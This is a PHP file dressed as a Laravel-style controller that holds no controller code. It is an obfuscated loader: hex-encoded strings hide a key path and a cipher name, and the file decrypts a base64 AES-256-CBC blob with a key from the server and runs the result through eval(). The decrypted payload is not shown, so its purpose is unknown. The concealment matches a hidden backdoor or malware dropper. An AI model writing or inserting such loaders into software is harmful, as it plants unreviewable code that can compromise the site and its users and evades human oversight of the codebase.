<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dpxQzRNosIii55fHYJXX+Q==');

$c=base64_decode(

'Ibx2aHO2QLe5z+Q92GPUEQd2BLS1StW3m6KNEQBU+ri4fEKgo7fqQrLP6KJfcBfBm4/YutWu2FmC' .
'V50GkPeSq8jRV1qwTZ0oMfNBO9Z5xo/JV86oDVs8kQcj5VvrvUMJzhxUi3XGa9rwxWukCaSr9qjY' .
'bXoW6GY02d8UFn8vKmVJZGHSoUz0LW3eHTgrYINY9PO/1hvDP5tlcWudkIyAOCkhdZcWHOMK0ise' .
'KxmHH3tmM4wbrqIU2a1pvesNkTCu'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

